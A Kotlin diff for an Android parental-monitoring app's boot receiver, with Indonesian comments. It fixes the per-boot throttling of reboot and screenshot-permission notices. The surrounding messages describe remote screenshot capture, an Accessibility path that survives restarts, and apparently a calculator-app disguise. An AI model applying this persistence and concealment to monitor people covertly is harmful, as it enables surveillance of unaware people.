@@ -203,6 +203,25 @@ class BootReceiver : BroadcastReceiver() {
         @Volatile
         private var lastHandleAt = 0L
 
+        // Cap elapsed hanya sebidang di dalam boot yang sama
+        // (issue #1665): elapsedRealtime ter-reset tiap boot,
+        // jadi cap dari boot lama yang dibandingkan mentah
+        // dengan elapsed boot baru menelan keputusan gerbang
+        // (notifikasi bisa tak terkirim hanya karena boot
+        // sebelumnya mencap nilai elapsed yang mirip). Cap
+        // dianggap hanya bila boot_count pasangannya sama
+        // dengan boot berjalan; identitas tak terbaca (0)
+        // mempertahankan perilaku lama.
+        private fun capSebidangBoot(
+            meta: android.content.SharedPreferences,
+            kunciElapsed: String,
+            kunciBoot: String,
+            bootKini: Long
+        ): Long {
+            if (bootKini <= 0L) return meta.getLong(kunciElapsed, 0L)
+            return if (meta.getLong(kunciBoot, -1L) == bootKini) meta.getLong(kunciElapsed, 0L) else 0L
+        }
+
         private fun markHandled(context: android.content.Context, at: Long, full: Boolean = true) {
             synchronized(handleLock) { lastHandleAt = at }
             try {
@@ -267,6 +286,7 @@ class BootReceiver : BroadcastReceiver() {
             noteBootCounted(context)
         }
         val nowBoot = android.os.SystemClock.elapsedRealtime()
+        val bootKini = bootCount(context)
         val updated = intentAction == Intent.ACTION_MY_PACKAGE_REPLACED
         val freshBoot = nowBoot <= 120_000L
         synchronized(handleLock) { if (!updated && !freshBoot && lastHandleAt != 0L && nowBoot - lastHandleAt < 60_000L) return }
@@ -338,9 +358,9 @@ class BootReceiver : BroadcastReceiver() {
                 )
                 if (!a11yOn) {
                     val meta = context.getSharedPreferences(PreferencesManager.BOOT_META_PREFS_NAME, android.content.Context.MODE_PRIVATE)
-                    val lastShotNotice = meta.getLong("shot_notice_elapsed", 0L)
+                    val lastShotNotice = capSebidangBoot(meta, "shot_notice_elapsed", "shot_notice_boot", bootKini)
                     if (lastShotNotice == 0L || nowBoot < lastShotNotice || nowBoot - lastShotNotice >= 3_600_000L) {
-                        meta.edit().putLong("shot_notice_elapsed", nowBoot).apply()
+                        meta.edit().putLong("shot_notice_elapsed", nowBoot).putLong("shot_notice_boot", bootKini).apply()
                         val teksShot = if (intentAction == Intent.ACTION_MY_PACKAGE_REPLACED) {
                             "\uD83D\uDD01 Aplikasi baru diperbarui. Izin tangkap layar dari sistem hangus (aturan Android). Kirim /screenshot lalu tekan tombol \"\uD83D\uDDA5\uFE0F Beri izin sekali\" \u2014 atau aktifkan jalur Aksesibilitas di Setup agar tak perlu izin lagi walau restart."
                         } else {
@@ -358,9 +378,9 @@ class BootReceiver : BroadcastReceiver() {
             MessageScheduler.scheduleBootRestart(context)
             try {
                 val meta = context.getSharedPreferences(PreferencesManager.BOOT_META_PREFS_NAME, android.content.Context.MODE_PRIVATE)
-                val lastNotice = meta.getLong("reboot_notice_elapsed", 0L)
+                val lastNotice = capSebidangBoot(meta, "reboot_notice_elapsed", "reboot_notice_boot", bootKini)
                 if (lastNotice == 0L || nowBoot < lastNotice || nowBoot - lastNotice >= 3_600_000L) {
-                    meta.edit().putLong("reboot_notice_elapsed", nowBoot).apply()
+                    meta.edit().putLong("reboot_notice_elapsed", nowBoot).putLong("reboot_notice_boot", bootKini).apply()
                     com.redeye.parentalmonitor.data.MessageQueue.getInstance(context).addMessage("🔄 Monitoring coba jalan lagi. Bila sepi, buka aplikasi kalkulator.")
                     MessageScheduler.scheduleMessageSend(context)
                 }
